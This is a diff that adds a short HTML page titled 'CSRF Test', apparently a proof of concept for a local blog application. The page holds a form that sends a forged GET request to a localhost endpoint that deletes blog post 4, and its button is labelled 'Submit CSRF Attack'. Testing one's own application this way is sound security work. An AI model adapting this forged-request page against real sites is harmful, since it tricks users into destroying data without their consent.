@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>CSRF Test</h1>
+    <form action="http://localhost:8000/blogs/blog_posts/4/delete" method="GET">
+        <input type="hidden" name="data" value="value">
+        <input type="submit" value="Submit CSRF Attack">
+    </form>
+</body>
+</html>
